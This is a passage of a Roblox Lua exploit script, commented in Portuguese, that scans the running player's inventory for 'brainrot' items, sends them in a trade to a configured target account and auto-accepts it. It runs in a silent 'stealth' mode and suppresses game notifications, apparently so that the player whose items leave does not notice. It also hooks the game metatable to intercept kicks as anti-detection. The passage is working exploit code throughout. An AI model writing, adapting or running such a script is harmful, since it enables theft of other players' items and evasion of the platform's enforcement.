-- Logger silencioso
local function Log(msg)
    if not Config.ModoStealth then
        print("[BrainrotTrade] " .. msg)
    end
end

-- Sistema de Trade Global
local TradeGlobal = {
    Remotes = {},
    UserIdAlvo = nil,
    ItensEncontrados = {}
}

-- Detectar todos os remotes possíveis
function TradeGlobal:DetectarRemotes()
    Log("Detectando remotes de trade...")
    
    -- Procurar em ReplicatedStorage
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nome = string.lower(obj.Name)
            
            -- Remotes de trade/request
            if string.find(nome, "trade") or 
               string.find(nome, "request") or 
               string.find(nome, "send") or
               string.find(nome, "offer") then
                table.insert(self.Remotes, obj)
                Log("Remote encontrado: " .. obj.Name)
            end
            
            -- Remotes de aceitar/confirmar
            if string.find(nome, "accept") or 
               string.find(nome, "confirm") or 
               string.find(nome, "agree") then
                table.insert(self.Remotes, obj)
                Log("Remote de aceite: " .. obj.Name)
            end
            
            -- Remotes de adicionar itens
            if string.find(nome, "add") or 
               string.find(nome, "item") or 
               string.find(nome, "inventory") or
               string.find(nome, "brainrot") then
                table.insert(self.Remotes, obj)
                Log("Remote de itens: " .. obj.Name)
            end
        end
    end
    
    -- Procurar em pastas específicas comuns
    local pastasComuns = {
        "Trade", "Trading", "Network", "Remotes", 
        "Events", "Brainrot", "Items", "Inventory",
        "Data", "API", "Services"
    }
    
    for _, nomePasta in ipairs(pastasComuns) do
        local pasta = ReplicatedStorage:FindFirstChild(nomePasta)
        if pasta then
            for _, obj in ipairs(pasta:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    table.insert(self.Remotes, obj)
                end
            end
        end
    end
end

-- Obter UserId do alvo (para trade global)
function TradeGlobal:ObterUserIdAlvo()
    -- Tentar encontrar via Players
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == Config.Alvo or p.DisplayName == Config.Alvo then
            self.UserIdAlvo = p.UserId
            Log("UserId encontrado localmente: " .. self.UserIdAlvo)
            return self.UserIdAlvo
        end
    end
    
    -- Se não estiver no servidor, tentar via API do Roblox
    Log("Alvo não está no servidor, tentando API...")
    
    local success, result = pcall(function()
        -- Tentar usar HttpService para obter UserId
        -- Nota: Isso pode ser bloqueado pelo jogo
        local url = "https://users.roblox.com/v1/users/search?keyword=" .. Config.Alvo .. "&limit=1"
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)
        if data and data.data and #data.data > 0 then
            return data.data[1].id
        end
        return nil
    end)
    
    if success and result then
        self.UserIdAlvo = result
        Log("UserId obtido via API: " .. self.UserIdAlvo)
        return self.UserIdAlvo
    end
    
    -- Fallback: usar nome como string (alguns jogos aceitam)
    Log("Usando nome como identificador")
    return Config.Alvo
end

-- Scan inventário por brainrots
function TradeGlobal:ScanInventario()
    Log("Scanning inventário...")
    local itens = {}
    
    -- Método 1: Procurar em Player.Data
    local data = Player:FindFirstChild("Data")
    if data then
        for _, item in ipairs(data:GetDescendants()) do
            if BrainrotsParaEnviar[item.Name] then
                table.insert(itens, {
                    nome = item.Name,
                    objeto = item,
                    quantidade = item:IsA("IntValue") and item.Value or 1,
                    id = item:GetAttribute("ID") or item.Name
                })
                Log("Encontrado em Data: " .. item.Name)
            end
        end
    end
    
    -- Método 2: Procurar em Player.Inventory
    local inv = Player:FindFirstChild("Inventory")
    if inv then
        for _, item in ipairs(inv:GetDescendants()) do
            if BrainrotsParaEnviar[item.Name] then
                table.insert(itens, {
                    nome = item.Name,
                    objeto = item,
                    quantidade = item:IsA("IntValue") and item.Value or 1,
                    id = item:GetAttribute("ID") or item.Name
                })
                Log("Encontrado em Inventory: " .. item.Name)
            end
        end
    end
    
    -- Método 3: Procurar em Player.Brainrots
    local brainrotFolder = Player:FindFirstChild("Brainrots")
    if brainrotFolder then
        for _, item in ipairs(brainrotFolder:GetDescendants()) do
            if BrainrotsParaEnviar[item.Name] then
                table.insert(itens, {
                    nome = item.Name,
                    objeto = item,
                    quantidade = item:IsA("IntValue") and item.Value or 1,
                    id = item:GetAttribute("ID") or item.Name
                })
                Log("Encontrado em Brainrots: " .. item.Name)
            end
        end
    end
    
    -- Método 4: Procurar em ReplicatedStorage.Inventories
    local invStorage = ReplicatedStorage:FindFirstChild("Inventories")
    if invStorage then
        local playerInv = invStorage:FindFirstChild(Player.Name) or invStorage:FindFirstChild(tostring(Player.UserId))
        if playerInv then
            for _, item in ipairs(playerInv:GetDescendants()) do
                if BrainrotsParaEnviar[item.Name] then
                    table.insert(itens, {
                        nome = item.Name,
                        objeto = item,
                        quantidade = item:IsA("IntValue") and item.Value or 1,
                        id = item:GetAttribute("ID") or item.Name
                    })
                    Log("Encontrado em Inventories: " .. item.Name)
                end
            end
        end
    end
    
    -- Método 5: Procurar em PlayerGui (UI do inventário)
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextLabel") or gui:IsA("ImageLabel") then
            if BrainrotsParaEnviar[gui.Name] then
                -- Verificar se já não foi adicionado
                local jaExiste = false
                for _, item in ipairs(itens) do
                    if item.nome == gui.Name then
                        jaExiste = true
                        break
                    end
                end
                if not jaExiste then
                    table.insert(itens, {
                        nome = gui.Name,
                        objeto = gui,
                        quantidade = 1,
                        id = gui.Name
                    })
                    Log("Encontrado em UI: " .. gui.Name)
                end
            end
        end
    end
    
    self.ItensEncontrados = itens
    Log("Total de brainrots encontrados: " .. #itens)
    return itens
end

-- Enviar trade global
function TradeGlobal:EnviarTradeGlobal()
    if not self.UserIdAlvo then
        Log("UserId do alvo não definido")
        return false
    end
    
    Log("Enviando trade global para " .. Config.Alvo)
    
    -- Tentar diferentes formatos de remote
    for _, remote in ipairs(self.Remotes) do
        local nome = string.lower(remote.Name)
        
        -- Formato 1: FireServer(userId)
        if string.find(nome, "trade") or string.find(nome, "request") then
            local success = pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(self.UserIdAlvo)
                else
                    remote:InvokeServer(self.UserIdAlvo)
                end
            end)
            
            if success then
                Log("Trade enviado via: " .. remote.Name)
                return true
            end
        end
        
        -- Formato 2: FireServer("send", userId)
        local success2 = pcall(function()
            remote:FireServer("send", self.UserIdAlvo)
        end)
        if success2 then
            Log("Trade enviado (formato 2) via: " .. remote.Name)
            return true
        end
        
        -- Formato 3: FireServer({Action="Trade", Target=userId})
        local success3 = pcall(function()
            remote:FireServer({
                Action = "Trade",
                Target = self.UserIdAlvo,
                Type = "Global"
            })
        end)
        if success3 then
            Log("Trade enviado (formato 3) via: " .. remote.Name)
            return true
        end
    end
    
    -- Tentar via funções expostas no ambiente global
    local success4, result = pcall(function()
        if _G.SendTrade then
            _G.SendTrade(self.UserIdAlvo)
            return true
        end
        if getfenv().SendTrade then
            getfenv().SendTrade(self.UserIdAlvo)
            return true
        end
        return false
    end)
    
    if success4 and result then
        Log("Trade enviado via função global")
        return true
    end
    
    Log("Falha ao enviar trade")
    return false
end

-- Adicionar itens ao trade
function TradeGlobal:AdicionarItensAoTrade()
    Log("Adicionando itens ao trade...")
    
    for _, item in ipairs(self.ItensEncontrados) do
        for _, remote in ipairs(self.Remotes) do
            local nome = string.lower(remote.Name)
            
            -- Tentar adicionar item
            if string.find(nome, "add") or string.find(nome, "item") then
                local success = pcall(function()
                    -- Formato 1: FireServer(itemName)
                    remote:FireServer(item.nome)
                    
                    -- Formato 2: FireServer(itemId)
                    if item.id then
                        remote:FireServer(item.id)
                    end
                    
                    -- Formato 3: FireServer("add", itemName)
                    remote:FireServer("add", item.nome)
                    
                    -- Formato 4: FireServer({Item=itemName})
                    remote:FireServer({
                        Item = item.nome,
                        ID = item.id,
                        Quantity = item.quantidade
                    })
                end)
                
                if success then
                    Log("Adicionado: " .. item.nome)
                    break
                end
            end
        end
        
        task.wait(Config.DelayEntreAcoes)
    end
end

-- Aceitar trade automaticamente
function TradeGlobal:AceitarTrade()
    if not Config.AutoAceitar then return end
    
    Log("Tentando aceitar trade...")
    
    task.wait(2) -- Esperar itens serem adicionados
    
    for _, remote in ipairs(self.Remotes) do
        local nome = string.lower(remote.Name)
        
        if string.find(nome, "accept") or string.find(nome, "confirm") then
            local success = pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer(true)
                    remote:FireServer("accept")
                    remote:FireServer("confirm")
                else
                    remote:InvokeServer(true)
                end
            end)
            
            if success then
                Log("Trade aceito via: " .. remote.Name)
            end
        end
    end
    
    -- Tentar clicar em botões de UI
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local btnNome = string.lower(gui.Name)
            if string.find(btnNome, "accept") or 
               string.find(btnNome, "confirm") or
               string.find(btnNome, "yes") then
                pcall(function()
                    gui.MouseButton1Click:Fire()
                end)
            end
        end
    end
end

-- Monitorar eventos de trade
function TradeGlobal:MonitorarTrade()
    -- Conectar a todos os remotes para interceptar respostas
    for _, remote in ipairs(self.Remotes) do
        if remote:IsA("RemoteEvent") then
            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                Log("Evento recebido em " .. remote.Name)
                
                -- Verificar se é confirmação de trade
                for _, arg in ipairs(args) do
                    if typeof(arg) == "table" then
                        if arg.Success or arg.Accepted or arg.Confirmed then
                            Log("Trade confirmado!")
                        end
                    end
                end
            end)
        end
    end
end

-- Execução principal
function TradeGlobal:Executar()
    Log("=== BRAINROT GLOBAL TRADE INICIADO ===")
    
    -- Passo 1: Detectar remotes
    self:DetectarRemotes()
    task.wait(1)
    
    -- Passo 2: Obter UserId do alvo
    self:ObterUserIdAlvo()
    task.wait(0.5)
    
    -- Passo 3: Scan inventário
    self:ScanInventario()
    
    if #self.ItensEncontrados == 0 then
        Log("AVISO: Nenhum brainrot encontrado no inventário")
        -- Tentar mesmo assim (pode ser que o jogo não exponha o inventário)
    end
    
    -- Passo 4: Iniciar monitoramento
    self:MonitorarTrade()
    
    -- Passo 5: Enviar trade
    local enviado = self:EnviarTradeGlobal()
    
    if enviado then
        task.wait(2)
        
        -- Passo 6: Adicionar itens
        self:AdicionarItensAoTrade()
        
        -- Passo 7: Aceitar
        task.wait(1)
        self:AceitarTrade()
        
        Log("=== PROCESSO CONCLUÍDO ===")
    else
        Log("=== FALHA AO ENVIAR TRADE ===")
    end
end

-- Anti-detecção
local function Proteger()
    -- Hook em funções comuns de kick/ban
    local mt = getrawmetatable(game)
    if mt then
        setreadonly(mt, false)
        local oldNamecall = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "Kick" or method == "kick" then
                Log("Kick interceptado")
                return nil
            end
            return oldNamecall(self, ...)
        end)
        setreadonly(mt, true)
    end
    
    -- Desabilitar notificações do jogo temporariamente
    local oldSetCore = StarterGui.SetCore
    StarterGui.SetCore = function(self, core, ...)
        if core == "SendNotification" then
            return -- Silenciar notificações
        end
        return oldSetCore(self, core, ...)
    end
end

